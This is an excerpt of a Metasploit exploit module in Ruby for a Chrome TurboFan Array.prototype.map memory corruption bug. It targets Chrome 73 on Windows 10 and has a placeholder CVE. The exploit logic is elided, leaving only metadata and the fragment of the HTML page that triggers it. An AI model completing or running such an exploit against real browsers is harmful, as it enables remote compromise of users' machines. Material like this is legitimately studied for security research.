...
class MetasploitModule < Msf::Exploit::Remote
    ...
    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Chrome [TurboFan] Array.prototype.map wrong ElementsKind for output array Exploit",
            'Description'    => %q{
              This module exploits the memory corruption vulnerability (CVE-2019-????)
            ...
            'Targets'        =>
              [
                ...
                [ 'Chrome 73.0.3683.86 on Windows 10', { } ]
              ],
            'References'     =>
              [
                [ 'CVE', '2019-????' ],   # No CVE yet
    ...
    def get_html(t)
      ...
      setTimeout(function() {exploit();}, 50);
      </script>
      </html>
      HTML
